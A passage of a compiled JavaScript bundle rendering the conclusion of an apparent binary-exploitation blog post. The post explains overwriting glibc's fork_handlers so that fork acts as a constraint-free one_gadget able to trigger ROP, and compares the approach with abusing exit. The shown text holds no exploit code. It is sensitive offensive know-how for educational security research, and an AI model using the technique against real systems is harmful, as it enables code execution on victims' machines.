(112).png",alt:""}),(0,r.jsx)("figcaption",{children:(0,r.jsxs)("p",{children:[(0,r.jsx)("a",{href:"https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/sysv/linux/spawni.c#L415",children:"__spawnix"}),": Used by ",(0,r.jsx)("code",{children:"system"})]})})]}),"\n",(0,r.jsxs)(n.p,{children:["Well, like I mentioned in the beginning, by overwriting ",(0,r.jsx)(n.code,{children:"fork_handlers"}),", we effectively have turned ",(0,r.jsx)(n.code,{children:"fork"})," into a ",(0,r.jsx)(n.code,{children:"one_gadget"}),". However, this has a few benefits over a regular ",(0,r.jsx)(n.code,{children:"one_gadget"}),":"]}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"No constraints."}),"\n",(0,r.jsx)(n.li,{children:"Can trigger ROP."}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"So if you have a function call primitive, and don't have strong argument control, but can use an arbitrary write, this may be useful."}),"\n",(0,r.jsxs)(n.p,{children:["However, a lot of what's been done here can also be done with ",(0,r.jsx)(n.code,{children:"exit"}),", and easier as well, as that has explicit argument control, the only downside there is that you have to deal with pointer mangling too."]}),"\n",(0,r.jsx)(n.p,{children:"In conclusion, there may be some cases where this can be useful, but even if this is never used, I still think it was interesting, and I hope you did too :)"})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(o,{...e})}):o(e)}},4523:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/files/fork_handlers-14c2b89731c080f6dc6cdbb3ba3bfffe.zip"},8453:(e,n,s)=>{s.d(n,{R:()=>d,x:()=>c});var i=s(6540);const r={},t=i.createContext(r);function d(e){const n=i.useContext(t);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:d(e.components),i.createElement(t.Provider,{value:n},e.children)}}}]);